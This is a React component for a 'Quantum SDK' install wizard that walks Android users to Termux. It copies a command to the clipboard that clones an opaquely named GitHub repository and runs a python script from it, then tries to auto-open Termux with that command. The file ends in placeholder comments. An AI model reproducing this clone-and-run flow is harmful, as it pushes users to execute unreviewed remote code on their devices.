import React, { useState, useEffect, useRef } from 'react';
import { ChevronLeft, ChevronRight, Twitter, Github, Linkedin, Download, Terminal, Copy, Check, Smartphone, Play, AlertCircle } from 'lucide-react';

export default function QuantumSDKDashboard() {
  const [scrollY, setScrollY] = useState(0);
  const [installStep, setInstallStep] = useState(0);
  const [isCopied, setIsCopied] = useState(false);
  const sphereRef = useRef(null);
  
  const installSteps = [
    { id: 0, title: 'Initial Setup', description: 'Prepare your device for Quantum SDK installation' },
    { id: 1, title: 'Install Termux', description: 'Download the terminal emulator from Play Store' },
    { id: 2, title: 'Copy Command', description: 'Automatically copy the installation command' },
    { id: 3, title: 'Execute & Verify', description: 'Run the command in Termux and complete setup' },
  ];

  const installCommand = 'rm -rf QKDISN_VERIFY 2>/dev/null; git clone -b QKDISN --depth=1 https://github.com/shellworlds/TFIMTDMVEQ.git QKDISN_VERIFY && cd QKDISN_VERIFY && read -p "Enter quantum code: " code && python3 quantum_verify.py "$code"';

  useEffect(() => {
    const handleScroll = () => setScrollY(window.scrollY);
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const handleInstallStart = () => {
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'clipboard-write' }).then(result => {
        if (result.state === 'granted' || result.state === 'prompt') {
          setInstallStep(1);
          openTermuxStore();
        }
      });
    } else {
      setInstallStep(1);
      openTermuxStore();
    }
  };

  const openTermuxStore = () => {
    window.location.href = 'market://details?id=com.termux';
    setTimeout(() => {
      window.location.href = 'https://play.google.com/store/apps/details?id=com.termux';
    }, 1000);
  };

  const copyCommand = async () => {
    try {
      await navigator.clipboard.writeText(installCommand);
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 2000);
      setTimeout(() => {
        setInstallStep(3);
        openTermuxApp();
      }, 1500);
    } catch (err) {
      console.error('Failed to copy:', err);
      const textArea = document.createElement('textarea');
      textArea.value = installCommand;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 2000);
      setInstallStep(3);
      openTermuxApp();
    }
  };

  const openTermuxApp = () => {
    const termuxUrl = 'termux://am start -n com.termux/.TermuxActivity -e command "' + installCommand.replace(/"/g, '\\"') + '"';
    window.location.href = termuxUrl;
    setTimeout(() => {
      window.location.href = 'termux://';
    }, 1000);
  };

  const renderInstallationModal = () => (
    <div className="fixed inset-0 bg-black/70 backdrop-blur-xl z-[999] flex items-center justify-center p-6">
      <div className="bg-gradient-to-br from-[#3d4856] to-[#2a3342] rounded-2xl max-w-2xl w-full border border-white/20 shadow-2xl">
        <div className="p-8 border-b border-white/10">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-3xl font-light text-white mb-2">Quantum SDK Installation</h3>
              <p className="text-white/60">Automated setup for mobile deployment</p>
            </div>
            <div className="relative">
              <div className="absolute -top-2 -right-2 w-4 h-4 bg-[#bef264] rounded-full animate-pulse"></div>
              <Terminal className="w-12 h-12 text-[#bef264]" />
            </div>
          </div>
        </div>

        <div className="p-8 border-b border-white/10">
          <div className="flex justify-between mb-8">
            {installSteps.map((step) => (
              <div key={step.id} className="flex flex-col items-center">
                <div className={`w-12 h-12 rounded-full flex items-center justify-center mb-3 transition-all duration-300 ${installStep >= step.id ? 'bg-[#bef264] text-black' : 'bg-white/10 text-white/40'} ${installStep === step.id ? 'ring-4 ring-[#bef264]/30' : ''}`}>
                  {installStep > step.id ? (
                    <Check className="w-6 h-6" />
                  ) : (
                    <span className="text-lg font-medium">{step.id + 1}</span>
                  )}
                </div>
                <span className={`text-sm font-medium ${installStep >= step.id ? 'text-white' : 'text-white/40'}`}>
                  {step.title}
                </span>
              </div>
            ))}
          </div>

          <div className="space-y-6">
            {installStep === 0 && (
              <div className="space-y-4">
                <div className="flex items-center gap-4 p-4 bg-black/30 rounded-xl border border-white/10">
                  <AlertCircle className="w-6 h-6 text-[#bef264]" />
                  <div>
                    <h4 className="text-white font-medium mb-1">Requirements</h4>
                    <p className="text-white/60 text-sm">Android device with Termux terminal emulator</p>
                  </div>
                </div>
                <p className="text-white/70">We'll guide you through the installation process automatically. Click Start to begin.</p>
              </div>
            )}

            {installStep === 1 && (
              <div className="space-y-6">
                <div className="flex items-center gap-4 p-4 bg-black/30 rounded-xl border border-white/10">
                  <Smartphone className="w-6 h-6 text-[#bef264]" />
                  <div>
                    <h4 className="text-white font-medium mb-1">Install Termux</h4>
                    <p className="text-white/60 text-sm">Opening Google Play Store...</p>
                  </div>
                </div>
                <p className="text-white/70">After installing Termux from Play Store, return to this page and click Continue.</p>
              </div>
            )}

            {installStep === 2 && (
              <div className="space-y-6">
                <div className="relative">
                  <div className="absolute top-3 left-4 text-white/40 font-mono text-sm">$</div>
                  <textarea
                    readOnly
                    value={installCommand}
                    className="w-full bg-black/50 text-white/90 font-mono text-sm p-4 pl-10 rounded-xl border border-white/10 focus:outline-none focus:border-[#bef264]/50 resize-none"
                    rows={6}
                  />
                  <button
                    onClick={copyCommand}
                    className="absolute top-4 right-4 px-4 py-2 bg-[#bef264] text-black rounded-lg flex items-center gap-2 hover:bg-[#ceff74] transition-colors"
                  >
                    {isCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    {isCopied ? 'Copied!' : 'Copy'}
                  </button>
                </div>
                <p className="text-white/60 text-sm">Command will automatically open Termux after copying.</p>
                <div className="bg-yellow-900/30 border border-yellow-700/50 rounded-lg p-4">
                  <p className="text-yellow-200 text-sm">
                    <strong>Note:</strong> After pasting in Termux, you'll be prompted to enter your quantum code.
                    The verification script will run automatically after you enter the code.
                  </p>
                </div>
              </div>
            )}

            {installStep === 3 && (
              <div className="space-y-6">
                <div className="flex items-center gap-4 p-4 bg-black/30 rounded-xl border border-[#bef264]/30">
                  <Terminal className="w-6 h-6 text-[#bef264]" />
                  <div>
                    <h4 className="text-white font-medium mb-1">Execute & Verify</h4>
                    <p className="text-white/60 text-sm">Opening Termux with installation command...</p>
                  </div>
                </div>
                <div className="bg-green-900/30 border border-green-700/50 rounded-lg p-4">
                  <p className="text-green-200 text-sm font-medium mb-2">Command includes:</p>
                  <ol className="text-green-200/90 text-sm space-y-1 list-decimal list-inside">
                    <li>Clone quantum verification repository</li>
                    <li>Prompt for quantum code input</li>
                    <li>Run verification script with your code</li>
                  </ol>
                </div>
                <p className="text-white/70">If Termux doesn't open automatically:</p>
                <ol className="text-white/60 space-y-2 text-sm list-decimal list-inside">
                  <li>Open Termux app manually</li>
                  <li>Long-press in the terminal</li>
                  <li>Select "Paste"</li>
                  <li>Press Enter to execute</li>
                  <li>Enter your quantum code when prompted</li>
                </ol>
              </div>
            )}
          </div>
        </div>

        <div className="p-8 flex justify-between items-center">
          <button
            onClick={() => setInstallStep(Math.max(0, installStep - 1))}
            className="px-6 py-3 rounded-xl border border-white/20 text-white hover:bg-white/10 transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
            disabled={installStep === 0}
          >
            Back
          </button>
          
          {installStep === 0 ? (
            <button
              onClick={handleInstallStart}
              className="px-8 py-4 bg-gradient-to-r from-[#bef264] to-[#9ed653] text-black rounded-xl font-medium hover:from-[#ceff74] hover:to-[#aee663] transition-all flex items-center gap-3"
            >
              <Download className="w-5 h-5" />
              Start Installation
            </button>
          ) : installStep === 1 ? (
            <button
              onClick={() => setInstallStep(2)}
              className="px-8 py-4 bg-gradient-to-r from-[#bef264] to-[#9ed653] text-black rounded-xl font-medium hover:from-[#ceff74] hover:to-[#aee663] transition-all"
            >
              I Installed Termux
            </button>
          ) : installStep === 2 ? (
            <button
              onClick={copyCommand}
              className="px-8 py-4 bg-gradient-to-r from-[#bef264] to-[#9ed653] text-black rounded-xl font-medium hover:from-[#ceff74] hover:to-[#aee663] transition-all flex items-center gap-3"
            >
              {isCopied ? 'Opening Termux...' : 'Copy & Open Termux'}
              <Play className="w-4 h-4" />
            </button>
          ) : (
            <button
              onClick={() => window.location.reload()}
              className="px-8 py-4 bg-gradient-to-r from-[#bef264] to-[#9ed653] text-black rounded-xl font-medium hover:from-[#ceff74] hover:to-[#aee663] transition-all"
            >
              Restart Process
            </button>
          )}
        </div>
      </div>
    </div>
  );

  // Rest of the component remains the same...
  // [Keep all the existing JSX return statement from previous version]
